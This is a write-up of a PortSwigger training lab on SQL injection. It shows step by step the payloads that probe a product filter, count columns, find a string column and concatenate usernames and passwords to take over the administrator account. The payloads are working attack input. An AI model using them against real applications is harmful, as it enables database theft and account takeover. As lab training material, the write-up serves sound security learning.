---
layout: post
title: "SQL injection UNION attack, retrieving multiple values in a single column [Write-up]"
date: 2026-06-30
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** SQL injection UNION attack, retrieving multiple values in a single column

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

## Solution

This problem is similar to the previous one, but with one difference: our goal is to extract data from two columns into a single column. But let's start with a basic check.

```python
Pets'
```

We're getting a 500 error, so the next step is to check the number of columns.

```python
Pets' ORDER BY 1 --     200
Pets' ORDER BY 2 --     200
Pets' ORDER BY 3 --     500
```

We see that the table has two columns, so I decided to start by trying—just like in the previous problem—to extract the data right away using the table and column names we already know. 

```python
'+UNION+SELECT+username,+password+FROM+users+--
```

But this time I got an error, so I decided to check which column contains the string data 

```python
Pets' UNION SELECT NULL,NULL --    200
Pets' UNION SELECT 'TEST',NULL --    500
Pets' UNION SELECT NULL,'TEST' --    200
```

From the answers, we can see that we need column 2, and that’s the one we’ll use in the challenge title. We can also see that we need to extract data from column 1, so I checked the cheat sheet and found the payload we needed. 

```python
PostgreSQL	'foo'||'bar'
```

```python
Pets' UNION SELECT NULL,username ||' : '|| password FROM users --
```

We received our login credentials from the administrator, entered them into the login form, and completed the lab. 
